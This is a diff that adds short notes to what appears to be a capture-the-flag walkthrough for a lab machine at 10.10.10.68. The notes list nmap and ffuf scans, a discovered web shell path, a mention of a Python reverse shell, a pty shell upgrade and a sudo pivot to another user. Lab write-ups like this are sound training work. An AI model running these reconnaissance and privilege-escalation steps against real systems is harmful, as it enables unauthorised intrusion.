@@ -1,4 +1,16 @@
 ```
+ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.10.68/FUZZ -fc 403 -e .aspx,.php,.txt,.html
+/dev/phpbash.php
+reverse shell - python
+python3 -c "import pty;pty.spawn('/bin/bash')"
+sudo -l
+sudo -u scriptmanager bash -i
+python -c shell.py
+```
+
+
+
+```
 nmap -sS -sC -sV -T5 -Pn 10.10.10.68
 ```
 ![image](https://user-images.githubusercontent.com/33616880/231078057-77c3fa36-7209-4521-8619-dacbe002e5e0.png)
